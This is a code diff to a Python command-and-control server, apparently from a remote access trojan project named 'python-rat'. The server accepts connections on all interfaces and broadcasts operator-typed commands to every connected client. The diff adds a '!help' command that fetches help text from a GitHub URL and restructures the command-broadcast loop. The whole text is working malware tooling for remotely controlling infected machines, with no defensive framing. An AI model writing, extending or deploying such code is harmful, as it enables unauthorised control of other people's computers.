@@ -1,5 +1,6 @@
 import socket
 import threading
+import requests
 
 SERVER = "0.0.0.0"
 PORT = int(input('Port >>> '))
@@ -59,13 +60,22 @@ def send_commands():
                     except Exception as e:
                         print(f'[!] Error sending command to client {client.getpeername()}: {e}')
             break
-        
-        with lock:
-            for client in clients:
-                try:
-                    client.send(cmd.encode())
-                except Exception as e:
-                    print(f'[!] Error sending command to client {client.getpeername()}: {e}')
+        elif cmd.lower() == '!help':
+            try:
+                response = requests.get('https://raw.githubusercontent.com/s1uiasdad/python-rat/main/server/help.txt')
+                if response.status_code == 200:
+                    print(response.text)
+                else:
+                    print('[!] Failed to fetch help content')
+            except Exception as e:
+                print(f'[!] Error fetching help content: {e}')
+        else:
+            with lock:
+                for client in clients:
+                    try:
+                        client.send(cmd.encode())
+                    except Exception as e:
+                        print(f'[!] Error sending command to client {client.getpeername()}: {e}')
 
 accept_thread = threading.Thread(target=accept_clients)
 accept_thread.start()
